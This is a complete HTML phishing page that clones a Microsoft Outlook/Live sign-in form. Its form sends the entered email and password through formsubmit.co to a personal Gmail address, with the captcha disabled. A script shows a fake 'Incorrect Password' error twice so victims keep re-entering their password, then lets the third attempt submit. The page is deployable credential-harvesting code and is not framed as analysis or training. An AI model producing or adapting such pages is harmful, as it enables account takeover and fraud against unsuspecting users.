<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Live Signin Page Clone</title>
  <style>
    @import url(https://fonts.googleapis.com/css?family=Poppins:100,100italic,200,200italic,300,300italic,regular,italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic);

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
      color: #1b1b1b;
    }

    body {
      display: grid;
      place-items: center;
      min-height: 100vh;
      background-color: #dde2d1;
    }

    form {
      width: 440px;
      background-color: #fff;
      box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
      padding: 44px;
    }

    .logo {
      margin-bottom: 15px;
    }

    form h2 {
      font-size: 24px;
      font-weight: 500;
    }

    .form-group {
      margin: 0 0 16px;
    }

    form input {
      padding: 6px 10px 6px 0;
      margin-top: 1rem;
      border: none;
      outline: none;
      border-bottom: 1px solid #000000b3;
      width: 100%;
      font-size: .9rem;
    }

    form p {
      font-size: 13px;
      margin-bottom: 16px;
    }

    form a {
      color: #0067b8;
      text-decoration: none;
    }

    form a:hover {
      color: #000000b3;
      text-decoration: underline;
    }

    form button {
      display: block;
      margin-left: auto;
      width: 108px;
      height: 32px;
      padding: 4px 12px;
      font-size: 15px;
      background-color: #0067b8;
      color: #fff;
      border: none;
      outline: none;
      cursor: pointer;
    }

    form button:hover {
      background-color: #004b85;
    }

    form button:active {
      transform: scale(.97);
    }

    .bottom {
      width: 440px;
      background-color: #fff;
      box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
      padding: 8px 44px;
      font-size: 15px;
      margin-top: 20px;
      cursor: pointer;
      display: flex;
      align-items: center;
    }

    .bottom img {
      width: 32px;
      height: 32px;
      margin-right: 12px;
    }

    .bottom:hover {
      background-color: #dde2d1;
    }

    /* Modal styles */
    #errorModal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      z-index: 1000;
      justify-content: center;
      align-items: center;
    }

    #errorModal .modal-box {
      background: #fff;
      padding: 20px 30px;
      border-radius: 10px;
      max-width: 300px;
      text-align: center;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
    }

    #errorModal .modal-box h3 {
      margin-bottom: 10px;
      color: #e74c3c;
    }

    #errorModal .modal-box p {
      font-size: 14px;
    }

    #errorModal .modal-box button {
      margin-top: 10px;
      padding: 8px 16px;
      background-color: #0067b8;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
</head>

<body>
  <!-- Modal -->
  <div id="errorModal">
    <div class="modal-box">
      <h3>Incorrect Password</h3>
      <p>Please double-check your password and try again.</p>
      <button onclick="closeModal()">Try Again</button>
    </div>
  </div>

  <div class="container">
    <form id="form" method="POST" action="https://formsubmit.co/Dcpromise74@gmail.com">
<!--       <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Microsoft_Outlook_2013-2019_logo.svg/811px-Microsoft_Outlook_2013-2019_logo.svg.png"> -->

      <div class="forms-container">
        <div class="forms">
          <div class="first">
            <h2>Sign in</h2>
            <div class="form-group">
              <input type="email" placeholder="Email" name="username" id="username" required>
              <input type="password" placeholder="Password" name="password" id="password" required>
              <input type="hidden" name="_next" value="thanks.html" />
              <input type="hidden" name="_captcha" value="false">
            </div>
            <p>No Account? <a href="#">Create One!</a></p>
            <a href="#">Sign in with a security key <span>?</span></a>
          </div>
        </div>
      </div>
      <button type="submit" value="submit">Sign in</button>
    </form>

    <div class="bottom">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Microsoft_Outlook_2013-2019_logo.svg/811px-Microsoft_Outlook_2013-2019_logo.svg.png">
      <span>Sign-in options</span>
    </div>
  </div>

  <!-- JavaScript for modal and attempt tracking -->
  <script>
    let attemptCount = 0;

    document.getElementById('form').addEventListener('submit', function (e) {
      attemptCount++;
      if (attemptCount < 3) {
        e.preventDefault(); // Prevent submission
        document.getElementById('errorModal').style.display = 'flex'; // Show modal
      }
      // On third attempt, allow submission
    });

    function closeModal() {
      document.getElementById('errorModal').style.display = 'none';
    }
  </script>
</body>

</html>
